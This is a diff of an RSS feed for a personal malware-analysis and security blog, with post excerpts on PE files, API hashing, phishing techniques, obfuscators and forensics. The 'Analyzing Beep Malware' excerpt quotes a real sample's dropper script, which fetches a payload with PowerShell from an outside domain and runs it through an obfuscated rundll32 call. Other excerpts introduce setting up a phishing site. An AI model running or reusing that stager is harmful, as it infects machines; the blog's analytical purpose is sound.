@@ -4,7 +4,7 @@
     <title>Posts on Journal of Connar</title>
     <link>http://localhost:1313/posts/</link>
     <description>Recent content in Posts on Journal of Connar</description>
-    <generator>Hugo -- 0.123.8</generator>
+    <generator>Hugo -- 0.134.3</generator>
     <language>en-us</language>
     <lastBuildDate>Wed, 12 Jun 2024 20:03:02 +0200</lastBuildDate>
     <atom:link href="http://localhost:1313/posts/index.xml" rel="self" type="application/rss+xml" />
@@ -13,83 +13,143 @@
       <link>http://localhost:1313/posts/insideapefile/</link>
       <pubDate>Wed, 12 Jun 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/insideapefile/</guid>
-      <description>Intro In this post we will observe the fields a Portable Executable file (PE or also known as Image) has, how are they connected to each other and how can they be utilized to load addresses of functions, names of functions and ordinals - amongst other fields - by writing a program that reads and loads these parts of an executable. The executable we will be disassecting will be mspaint.exe.</description>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;In this post we will observe the fields a Portable Executable file (PE or also known as Image) has, how are they connected to each other and how can they be utilized to load addresses of functions, names of functions and ordinals - amongst other fields - by writing a program that reads and loads these parts of an executable. The executable we will be disassecting will be mspaint.exe.&lt;/p&gt;</description>
     </item>
     <item>
       <title>API Hashing - Extensive breakdown</title>
       <link>http://localhost:1313/posts/apihashing/</link>
       <pubDate>Thu, 06 Jun 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/apihashing/</guid>
-      <description>Intro As mentioned in the Exploring PEB struct and its fields post, we will now see how to to use a technique known as API Hashing. API hashing is a technique used in malware to identify API functions by their hash value from their names or other attributes. This hash value can then be used instead of the function names or other attributes to enumerate, rehash, compare and use functions based on the hash value.</description>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;As mentioned in the &lt;b&gt;&lt;i&gt;Exploring PEB struct and its fields&lt;/i&gt;&lt;/b&gt; post, we will now see how to to use a technique known as API Hashing. API hashing is a technique used in malware to identify API functions by their hash value from their names or other attributes. This hash value can then be used instead of the function names or other attributes to enumerate, rehash, compare and use functions based on the hash value. This way, direct calls by function names is avoided and thus leads to fewer detection rates. More specifically, it is used to make the work of analysts harder since names of WINAPI functions or DLL&amp;rsquo;s won&amp;rsquo;t show in string commands or tools like CFF Explorer, so the intentions of the executable won&amp;rsquo;t be so clear from the beginning.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Exploring PEB struct and its fields</title>
       <link>http://localhost:1313/posts/peb/</link>
       <pubDate>Sat, 11 May 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/peb/</guid>
-      <description>Intro This is the first post of the malware series that me and my friend @r4sti will be starting. We basically started learning malware concepts, dev and windows internals, and I will keep track of what we learn - like the rest of the things in this blog:)
-Special thanks to him cause he is basically teaching me 70% of this stuff lol.
-So in this post, we will dive into:</description>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;This is the first post of the malware series that me and my friend @r4sti will be starting. We basically started learning malware concepts, dev and windows internals, and I will keep track of what we learn - like the rest of the things in this blog:)&lt;br&gt;
+&lt;small&gt;&lt;i&gt;Special thanks to him cause he is basically teaching me 70% of this stuff lol.&lt;/i&gt;&lt;/small&gt;&lt;/p&gt;
+&lt;p&gt;So in this post, we will dive into:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Browser-in-the-Browser (BitB) attack</title>
       <link>http://localhost:1313/posts/bitb/</link>
       <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/bitb/</guid>
-      <description>What is the Browser-in-the-Browser attack BitB attack is a phishing technique displayed by mr.d0x that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.
-Basically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.</description>
+      <description>&lt;h2 id=&#34;what-is-the-browser-in-the-browser-attack&#34;&gt;What is the Browser-in-the-Browser attack&lt;/h2&gt;
+&lt;p&gt;BitB attack is a phishing technique displayed by &lt;strong&gt;mr.d0x&lt;/strong&gt; that essentially abuses the Single-Sign-On (SSO) window and modifies the shown url of the popped-up window to seem like a legitimate one.&lt;/p&gt;
+&lt;p&gt;Basically, the concept of this attack is to host a phishing website and inside the phishing website to create a legitimate looking SSO window (with a valid url) which is a phishing window as well.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Exploring the BatchEncryption tool (and its deobfuscator) by gwsbhqt@163.com </title>
       <link>http://localhost:1313/posts/batchencryption/</link>
       <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/batchencryption/</guid>
-      <description>What is the BatchEncryption tool The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (&amp;quot;&amp;rsquo;&amp;quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.</description>
+      <description>&lt;h2 id=&#34;what-is-the-batchencryption-tool&#34;&gt;What is the BatchEncryption tool&lt;/h2&gt;
+&lt;p&gt;The BatchEncryption tool is a tool used for obfuscating batch files. It is rather one of the most uncommon ones since it combines known and custom environment variable encodings to obfuscate the script. The way it works is it sets a randomly generated dictionary into a custom envar which is just a single quote (&amp;quot;&amp;rsquo;&amp;quot;). It then encodes it with existing environment variable substrings and then takes the remainder of the command using substrings of the custom environment variable declared previously.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Exploring the Jlaive and UnJlaive tool</title>
       <link>http://localhost:1313/posts/jlaive/</link>
       <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/jlaive/</guid>
-      <description>What will this post be about This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.</description>
+      <description>&lt;h2 id=&#34;what-will-this-post-be-about&#34;&gt;What will this post be about&lt;/h2&gt;
+&lt;p&gt;This post will be about the Jlaive and Get-UnJlaive tools. I will not go into depth as there are other resources I will list that do a great job explaining more in depth of the ins and outs of these tools. This will just be an overview of the tools: &lt;strong&gt;How to obfuscate an executable with Jlaive and how to recover it using Get-UnJlaive.&lt;/strong&gt;&lt;/p&gt;</description>
     </item>
     <item>
       <title>Exploring the pCraft tool</title>
       <link>http://localhost:1313/posts/pcraft/</link>
       <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/pcraft/</guid>
-      <description>What is the pCraft tool pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.
-Installation To install the tool, you can either clone it from its github repo:
-https://github.com/DevoInc/pCraft or by using docker.
-I had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.</description>
+      <description>&lt;h2 id=&#34;what-is-the-pcraft-tool&#34;&gt;What is the pCraft tool&lt;/h2&gt;
+&lt;p&gt;pCraft is a tool used to generate pcaps based on a scenario written in an ami file. The generated pcap file can then be used for the testing of rules etc.&lt;/p&gt;
+&lt;h2 id=&#34;installation&#34;&gt;Installation&lt;/h2&gt;
+&lt;p&gt;To install the tool, you can either clone it from its github repo:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://github.com/DevoInc/pCraft&#34;&gt;https://github.com/DevoInc/pCraft&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;or by using docker.&lt;br&gt;
+I had some issues when running the tool from the github repo (dependency errors with the pyami module), so I went with the docker option instead, which is what I will demonstrate.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Learning about Windows API</title>
       <link>http://localhost:1313/posts/windowsapi/</link>
       <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/windowsapi/</guid>
-      <description>Intro As I am starting to take a turn of interest into malware analysis and development, I was required to understand what the Windows API really is. So this post is basically my notes on what windows api is and a few examples of it.
-Was exactly is an API When you use a Windows application, have you ever wondered how it seamlessly interacts with the operating system? The magic behind this interaction is the Windows API.</description>
+      <description>&lt;h3 id=&#34;intro&#34;&gt;Intro&lt;/h3&gt;
+&lt;p&gt;As I am starting to take a turn of interest into malware analysis and development, I was required to understand what the Windows API really is. So this post is basically my notes on what windows api is and a few examples of it.&lt;/p&gt;
+&lt;h3 id=&#34;was-exactly-is-an-api&#34;&gt;Was exactly is an API&lt;/h3&gt;
+&lt;p&gt;When you use a Windows application, have you ever wondered how it seamlessly interacts with the operating system? The magic behind this interaction is the Windows API. Generally, an api allows for two pieces of software to interact upon another. When it comes to programming, it allows your code to interact with the windows operating system.&lt;br&gt;
+Let&amp;rsquo;s dive into what the Windows API is and why it&amp;rsquo;s crucial for software development on the Windows platform - but also for red teamers, threat actors and blue teamers as well.&lt;/p&gt;</description>
     </item>
     <item>
       <title>Setting up a phishing site [using blackeye tool]</title>
       <link>http://localhost:1313/posts/phishingsite/</link>
       <pubDate>Mon, 11 Mar 2024 20:03:02 +0200</pubDate>
       <guid>http://localhost:1313/posts/phishingsite/</guid>
-      <description>Intro In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: BitB ).
-There are plenty of tools out there to quickly set up a phishing website. For example:
-Socialphish Shell Phish Zphisher Blackeye and plenty others, but also platforms like gophish.
-I just happened to be reading something about Blackeye tool, so we&amp;rsquo;ll go with this option.</description>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;In this post we are going to see how to make a phishing website to then use for other attacks such as the Browser-in-the-Browser attack ( see: &lt;a href=&#34;http://localhost:1313/posts/bitb/&#34; title=&#34;BitB post&#34;&gt;BitB&lt;/a&gt; ).&lt;br&gt;
+There are plenty of tools out there to quickly set up a phishing website. For example:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;Socialphish&lt;/li&gt;
+&lt;li&gt;Shell Phish&lt;/li&gt;
+&lt;li&gt;Zphisher&lt;/li&gt;
+&lt;li&gt;Blackeye
+and plenty others, but also platforms like gophish.&lt;br&gt;
+I just happened to be reading something about Blackeye tool, so we&amp;rsquo;ll go with this option.&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;setup-of-blackeye&#34;&gt;Setup of blackeye&lt;/h2&gt;
+&lt;p&gt;Its very quick and easy to set up blackeye. All you have to do is the following:&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Analyzing Beep Malware</title>
+      <link>http://localhost:1313/posts/beepmalware/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/beepmalware/</guid>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;In continuation from my previous &lt;a href=&#34;https://connar.github.io/posts/onenote/&#34;&gt;post&lt;/a&gt;, I will now be analyzing the dropped &lt;code&gt;big.dll&lt;/code&gt;. For this purpose, I employed my friend and mentor r4sti to help me out in the analysis of this malicious dll.&lt;/p&gt;
+&lt;h2 id=&#34;analyzing-bigdll---combining-ida-and-x32dbg&#34;&gt;Analyzing big.dll - Combining IDA and x32dbg&lt;/h2&gt;
+&lt;p&gt;Recall that in our previous post, when the dll was being dropped, a specific exported function was run:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;@&lt;span style=&#34;color:#66d9ef&#34;&gt;echo&lt;/span&gt; off
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;powershell Invoke-WebRequest -URI https://aradcapital.com/MpD8Yk/00.gif -OutFile C:\programdata\big.jpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;call&lt;/span&gt; ru%1l32 C:\programdata\big.jpg,DllRegisterServer
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;exit&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;So, let&amp;rsquo;s open the dll in IDA and view the specific function:&lt;/p&gt;</description>
     </item>
     <item>
       <title>Exploring OneNote Forensic tools</title>
       <link>http://localhost:1313/posts/onenote/</link>
       <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
       <guid>http://localhost:1313/posts/onenote/</guid>
-      <description>Intro In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:
-OneNoteAnalyzer.exe pyonenote.py The sample I practised on is the following:
-https://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/ Viewing the sample Opening the sample in an online .one viewer, we can observe the following:
-We can see that a .cmd script is placed at the &amp;lsquo;Open&amp;rsquo; button which is what the document asks the user to double click.</description>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;In this post, I will be writing my notes regarding some OneNote forensic tools that I got my hands on, but also the analysis of a sample I got from MalwareBazar to practise. The tools are:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;OneNoteAnalyzer.exe&lt;/li&gt;
+&lt;li&gt;pyonenote.py&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;The sample I practised on is the following:&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;a href=&#34;https://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/&#34;&gt;https://bazaar.abuse.ch/download/9019a31723e8dde778639cf5c1eb599bf250d7b6a3a92ba0e3c85b0043644d93/&lt;/a&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;h2 id=&#34;viewing-the-sample&#34;&gt;Viewing the sample&lt;/h2&gt;
+&lt;p&gt;Opening the sample in an online .one viewer, we can observe the following:&lt;/p&gt;
+&lt;p&gt;&lt;img loading=&#34;lazy&#34; src=&#34;http://localhost:1313/posts/onenote/onenote1.png&#34; alt=&#34;&#34;  /&gt;
+&lt;/p&gt;
+&lt;p&gt;We can see that a .cmd script is placed at the &amp;lsquo;Open&amp;rsquo; button which is what the document asks the user to double click. It obviously tries to convince the user into running the .cmd script. Let&amp;rsquo;s use the OneNoteAnalyzer.exe tool to extract this script along with other relevant information attached to the document.&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>scapy for pcap parsing</title>
+      <link>http://localhost:1313/posts/scapy/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/scapy/</guid>
+      <description>&lt;h2 id=&#34;intro&#34;&gt;Intro&lt;/h2&gt;
+&lt;p&gt;In this post we will explore the scapy library in python and its features when it comes to analyzing pcap files. In general, scapy library can be used for both red team (sniffing traffic) and blue team operations (analyzing pcap files). We will stick to the second one for this post.&lt;/p&gt;
+&lt;p&gt;I learned about scapy back when I started playing CTF challenges and was trying to solve a challenge where data had been exfiltrated through the ICMP protocol (we will see that challenge later). The idea in that challenge was that data was exfiltrated from the victim machine through ping requests - byte by byte. As you can tell, it was really difficult to manually reconstruct the exfiltrated data as this would mean copying and pasting the corresponding data from each packet. This is not really practical if you have a big pcap file.&lt;/p&gt;</description>
     </item>
   </channel>
 </rss>
